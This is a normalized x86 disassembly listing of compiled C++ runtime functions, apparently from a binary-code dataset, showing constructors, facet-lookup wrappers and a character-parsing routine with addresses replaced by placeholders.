mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004b516
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1004b5a9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1004b29b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1004b5d0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004b516
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1004b5f5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1004b29b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1004b638
push 0x40
mov eax sub_1004f5c4
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_100082a7
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_100014aa
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x3c ]
push eax
call sub_100367d7
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10008213
mov ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x3c ] eax
jmp r-xdata
dec edi
jne r-xdata
lea ecx [ ebp - 0x40 ]
call sub_10006d06
mov ecx eax
call sub_10006ccf
mov al [ eax ]
mov [ ebp - 0x38 ] al
push [ ebp - 0x38 ]
lea ecx [ ebp + 0xc ]
call sub_1003f048
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x44 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push edi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_100020e2
mov eax esi
call sub_1002b392
retn 0x20
sub_1004b726
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004b1ed
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004b7c0
push 0x24
mov eax sub_1004f602
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x10 ] ecx
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_100082a7
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000133e
mov eax esi
call sub_1002b37e
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000133e
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10008213
mov ecx eax
call sub_10006ccf
push [ ebp - 0x10 ]
add edi ebx
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push edi
push eax
call sub_1004e016
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_1004b86b
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004b907
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004b255
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004b9a6
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004b278
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004ba45
push 0x94
mov eax sub_1004f65c
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1004b584
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004bb38
push 0x94
mov eax sub_1004f65c
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1004b5d0
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004bbd7
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004b2dd
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004bc76
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004b726
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004bd13
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004b86b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004bdb0
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004b907
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004be4d
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004b9a6
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004beea
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004ba45
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004bf87
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004bb38
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004c024
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004bbd7
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004c0c1
push 0x170
mov eax sub_1004f75a
call sub_1002b30f
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
and [ ebp - 0x6c ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x84 ] eax
mov ecx eax
je r-xdata
lea eax [ ebp - 0xbc ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1004beea
pop ecx
mov edi eax
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0xbc ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1004bf87
mov edi eax
pop ecx
mov [ ebp - 0x90 ] edi
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx 0x4
jae r-xdata
call sub_10007dbd
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_100082a7
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_100082a7
mov eax [ edi ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx edi
mov [ ebp - 0x6c ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x98 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10001f47
jmp r-xdata
cmp [ ebp - 0x50 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_100020e2
mov eax [ ebp - 0x7c ]
call sub_1002b392
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10008213
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x98 ]
cmp [ ebp - 0x65 ] 0x0
mov ebx [ ebp - 0x94 ]
je r-xdata
mov ecx [ ebp - 0x84 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1000cfaa
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10007dbd
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_1003f21b
mov eax [ ebp - 0x84 ]
test [ eax + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0x2d
push 0x1
push 0x0
call sub_10005cf6
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10008282
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006d06
mov ecx eax
call sub_10006cba
test al al
jne r-xdata
mov edi [ ebp - 0x90 ]
push [ ebp - 0x74 ]
push ebx
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x98 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx ebx
call sub_1003f0b8
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push ebx
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10008282
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006cba
test al al
je r-xdata
mov ecx ebx
call sub_1003f1eb
mov ecx [ esi + 0x10 ]
movzx eax al
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008213
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xa0 ] ecx
mov [ ebp - 0x9c ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x1
ja r-xdata
mov ecx ebx
call sub_1003f1eb
cmp al [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx edi
call sub_10043240
or [ ebp - 0x6c ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ edi ]
xor esi esi
mov ecx edi
mov [ ebp - 0x80 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0xa4 ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10043163
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x34 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_10006ccf
mov ecx ebx
mov esi eax
call sub_1003f1eb
cmp al [ esi ]
jne r-xdata
mov ecx ebx
call sub_1003f06e
push [ ebp - 0x74 ]
push ebx
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx ebx
call sub_1003f0b8
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001f47
mov [ ebp - 0x6d ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edi
call sub_10043240
or [ ebp - 0x6c ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_10005d90
mov ecx ebx
mov esi eax
call sub_1003f1eb
mov [ ebp - 0x6d ] 0x1
cmp [ esi ] al
je r-xdata
push [ ebp - 0x74 ]
push ebx
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x6d ] al
test al al
je r-xdata
mov ecx ebx
call sub_1003f06e
lea eax [ ebp - 0xcc ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008282
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10006cba
test al al
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008282
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10006cba
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x6c ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x6c ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_100020e2
xor esi esi
test [ ebp - 0x6c ] 0x4
je r-xdata
mov ecx ebx
call sub_1003f1eb
cmp al 0x30
jl r-xdata
mov ecx [ ebp - 0x90 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov esi [ ebp - 0x94 ]
push esi
mov bl al
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
lea ecx [ ebp - 0xa0 ]
call sub_10006ccf
mov ecx ebx
mov esi eax
call sub_1003f1eb
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx ebx
call sub_1003f1eb
cmp al [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x6d ] 0x0
je r-xdata
and [ ebp - 0x6c ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_100020e2
mov ecx ebx
call sub_1003f1eb
cmp al 0x39
jg r-xdata
mov edi [ ebp - 0xa4 ]
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0xa0 ]
call sub_10006d06
mov ecx ebx
call sub_1003f06e
lea eax [ ebp - 0x144 ]
push eax
mov ecx edi
call sub_1004317c
or [ ebp - 0x6c ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx ebx
call sub_1003f06e
lea eax [ ebp - 0x160 ]
push eax
mov ecx edi
call sub_10043240
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x7
call sub_100021c3
push esi
lea ecx [ ebp - 0x160 ]
jmp r-xdata
mov ecx ebx
call sub_1003f1eb
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xac ] al
push [ ebp - 0xac ]
push 0x1
call sub_100014aa
mov ecx ebx
call sub_1003f06e
cmp [ ebp - 0x80 ] edi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx esi
call sub_1003f1eb
cmp al bl
jne r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
push [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xc
push ebx
xor edi edi
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x10c ]
push eax
mov ecx edi
call sub_1004317c
or [ ebp - 0x6c ] 0x10
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_10005d90
mov ecx ebx
mov esi eax
call sub_1003f1eb
cmp [ esi ] al
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_100020e2
jmp r-xdata
lea ecx [ ebp - 0x48 ]
jmp r-xdata
sub edi [ ebp - 0x80 ]
mov ecx esi
call sub_1003f06e
push [ ebp - 0x74 ]
push esi
call sub_1003f200
mov edi [ ebp - 0xa4 ]
